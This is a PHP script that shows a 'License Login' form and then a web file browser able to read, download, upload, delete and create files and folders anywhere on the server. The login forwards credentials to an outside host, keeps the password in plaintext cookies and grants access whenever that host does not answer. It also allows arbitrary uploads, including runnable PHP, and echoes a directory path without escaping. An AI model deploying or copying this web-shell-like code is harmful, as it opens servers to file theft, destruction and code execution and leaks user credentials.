<?php Error_Reporting(0); $_REQUEST=Array_Merge($_GET, $_POST, $_COOKIE); If (!IsSet($_REQUEST['AUTH'])){?> <!DOCTYPE HTML> <html> <head> <title>LOGIN</title> <meta http-equiv="Content-Type" content="text/html; charset=utf-8"> <link href="//maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css" rel="stylesheet"> </head> <body> <div class="container"> <h1>License Login</h1> <form action="" method="post" class="form-horizontal" role="form"> <div class="form-group"> <label for="" class="col-sm-2">License user</label> <div class="col-sm-10"><input type="text" name="AUTH[USER]" class="form-control"></div> </div> <div class="form-group"> <label for="" class="col-sm-2">License password</label> <div class="col-sm-10"><input type="password" name="AUTH[PASSWORD]" class="form-control"></div> </div> <div class="form-group"> <div class="col-sm-offset-2 col-sm-10"> <button type="submit" class="btn btn-default">Sign in</button> </div> </div> </form> </div> </body> </html> <?php Exit;}Else{$api_login=File_Get_Contents('http://api.dennishoppe.de/license-login/', False, Stream_Context_Create(Array( 'http'=>Array( 'method'=>'POST', 'header'=>'Content-type: application/x-www-form-urlencoded', 'content'=>HTTP_Build_Query(Array( 'user'=>$_REQUEST['AUTH']['USER'], 'password'=>$_REQUEST['AUTH']['PASSWORD']),Null, '&'),'timeout'=>3 ) ))); If ($api_login===False){}ElseIf ($api_login=='false'){Header('HTTP/1.0 401 Unauthorized'); Die('Unauthorized: Wrong username/password combination');}Else{SetCookie('AUTH[USER]', $_REQUEST['AUTH']['USER']); SetCookie('AUTH[PASSWORD]', $_REQUEST['AUTH']['PASSWORD']);}}class Filebrowser{var $action, $directory, $file; function __construct(){$this->action=IsSet($_REQUEST['action']) ? StrToLower($_REQUEST['action']) : 'browse'; $this->directory=IsSet($_REQUEST['dir']) ? RealPath($_REQUEST['dir']).'/' : RealPath('.').'/'; $this->file=IsSet($_REQUEST['file']) ? $_REQUEST['file'] : Null;}function Get_Subfolder($directory){If (Defined('GLOB_BRACE')) $arr_folder=(Array) Glob($directory.'{,.}*', GLOB_BRACE + GLOB_ONLYDIR); Else $arr_folder=(Array) Glob($directory.'*', GLOB_ONLYDIR); $sort_order=Array(); ForEach ($arr_folder AS $index=>$folder){$path=RealPath ($folder).'/'; If (!Is_Dir($path) || BaseName($folder)=='.' || BaseName($folder)=='..') Unset ($arr_folder[$index]); Else{$arr_folder[$index]=$path; $sort_order[$index]=StrToLower($folder);}}Array_Multisort($sort_order, $arr_folder); return $arr_folder;}function Get_Files ($directory){If (Defined('GLOB_BRACE')) $arr_file=(Array) Glob($directory.'{,.}*', GLOB_BRACE); Else $arr_file=(Array) Glob($directory.'*'); $sort_order=Array(); ForEach ($arr_file AS $index=>$file){$path=RealPath ($file); If (!Is_File($path)) Unset ($arr_file[$index]); Else{$arr_file[$index]=$path; $sort_order[$index]=StrToLower($file);}}Array_Multisort($sort_order, $arr_file); return $arr_file;}function Build_Link($action, $dir=False, $file=False){$link=SPrintF('?%s', HTTP_Build_Query(Array( 'action'=>$action, 'dir'=>$dir ? $dir : Null, 'file'=>$file ? $file : Null),Null, '&')); return $link;}function HTML_Link($action, $dir='', $file='', $caption){PrintF('<a href="%1$s" title="">%2$s</a>', HTMLSpecialChars($this->build_link($action, $dir, $file)),$caption);}function delete_folder($directory){ForEach ((Array) $this->get_subfolder($directory) AS $folder){$this->delete_folder($folder);}ForEach ((Array) $this->get_files($directory) AS $file){Unlink($file);}RmDir($directory);}}$filebrowser=New Filebrowser; If ($filebrowser->action=='browse') : ?> <!DOCTYPE HTML> <html> <head> <title>Browse: <?php Echo BaseName($filebrowser->directory) ?>/</title> <meta http-equiv="Content-Type" content="text/html; charset=utf-8"> <link href="//maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css" rel="stylesheet"> </head> <body> <div class="container"> <h1>Filebrowser</h1> <ol class="breadcrumb"> <li><span class="glyphicon glyphicon-hdd"></span></li> <?php $arr_path=Explode('/', Trim($filebrowser->directory, '/')); $arr_breadcrumbs=Array(); ForEach ($arr_path As $path_part){$path .=SPrintF('/%s', $path_part); $arr_breadcrumbs[$path]=$path_part;}ForEach ($arr_breadcrumbs As $path=>$item): ?> <li><?php $filebrowser->HTML_Link('browse', $path, '', $item) ?></li> <?php EndForEach ?> </ol> <?php If($arr_folder=$filebrowser->Get_Subfolder($filebrowser->directory)) : ?> <div class="panel panel-default"> <div class="panel-heading"> <h3 class="panel-title"> <span class="glyphicon glyphicon-folder-open"></span> Sub folder </h3> </div> <div class="panel-body"> <ul class="list-group"> <?php ForEach ($arr_folder AS $index=>$folder) : ?> <li class="list-group-item"> <span class="glyphicon glyphicon-folder-close"></span> &shy; <?php $filebrowser->HTML_Link('browse', $folder, '', BaseName($folder)) ?> &nbsp; <?php $filebrowser->HTML_Link('delfolder', $folder, '', '<span class="glyphicon glyphicon-trash"></span>') ?> </li> <?php EndForEach ?> </ul> </div> </div> <?php EndIf ?> <?php If($arr_file=$filebrowser->Get_Files($filebrowser->directory)) : ?> <div class="panel panel-default"> <div class="panel-heading"> <h3 class="panel-title"> <span class="glyphicon glyphicon-file"></span> Files </h3> </div> <div class="panel-body"> <ul class="list-group"> <?php ForEach ($arr_file AS $index=>$file) : ?> <li class="list-group-item"> <span class="glyphicon glyphicon-file"></span> &shy; <?php $filebrowser->HTML_Link('getfile', '', $file, BaseName($file)) ?> &nbsp; <?php $filebrowser->HTML_Link('getfile', '', $file, '<span class="glyphicon glyphicon-cloud-download"></span>') ?> &nbsp; <?php $filebrowser->HTML_Link('delfile', '', $file, '<span class="glyphicon glyphicon-trash"></span>') ?> </li> <?php EndForEach ?> </ul> </div> </div> <?php EndIf ?> <div class="panel panel-default"> <div class="panel-heading"> <h3 class="panel-title"> <span class="glyphicon glyphicon-cloud-upload"></span> Upload a new file to this directory </h3> </div> <div class="panel-body"> <form action="?action=uploadfile" method="post" enctype="multipart/form-data"> <input type="hidden" name="dir" value="<?php Echo $filebrowser->directory ?>"> <div class="input-group"> <span class="input-group-addon"><span class="glyphicon glyphicon-cloud-upload"></span></span> <input type="file" name="file" class="form-control" > <span class="input-group-btn"> <button type="submit" class="btn btn-default">Upload</button> </span> </div> </form> </div> </div> <div class="panel panel-default"> <div class="panel-heading"> <h3 class="panel-title"> <span class="glyphicon glyphicon-folder-open"></span> Create a new folder in this directory </h3> </div> <div class="panel-body"> <form action="?action=createfolder" method="post"> <input type="hidden" name="dir" value="<?php Echo $filebrowser->directory ?>"> <div class="input-group"> <span class="input-group-addon"><span class="glyphicon glyphicon-folder-open"></span></span> <input type="text" class="form-control" name="folder" placeholder="New folders name"> <span class="input-group-btn"> <button type="submit" class="btn btn-default">Create</button> </span> </div> </form> </div> </div> </div> </body> </html> <?php ElseIf ($filebrowser->action=='getfile') : Header('Status: 200'); Header('Content-Type: application/' . PathInfo($filebrowser->file, PATHINFO_EXTENSION)); Header(SPrintF('Content-Disposition: attachment; filename="%s"', BaseName($filebrowser->file))); Header('Content-Length:' . FileSize($filebrowser->file)); ReadFile ($filebrowser->file); Exit; ElseIf ($filebrowser->action=='delfile') : Unlink ($filebrowser->file); Header('Status: 307'); Header('Location: ' . $filebrowser->build_link('browse', DirName($filebrowser->file))); Exit; ElseIf ($filebrowser->action=='uploadfile') : Copy ($_FILES['file']['tmp_name'], $filebrowser->directory.$_FILES['file']['name']); Header('Status: 307'); Header('Location: ' . $filebrowser->build_link('browse', $filebrowser->directory)); Exit; ElseIf ($filebrowser->action=='createfolder') : $new_folder=$filebrowser->directory . Trim($_REQUEST['folder']); MKDir($new_folder, 0777, True); Header('Status: 307'); Header('Location: ' . $filebrowser->build_link('browse', $filebrowser->directory)); Exit; ElseIf ($filebrowser->action=='delfolder') : $filebrowser->delete_folder($filebrowser->directory); Header('Status: 307'); Header('Location: ' . $filebrowser->build_link('browse', DirName($filebrowser->directory))); Exit; EndIf;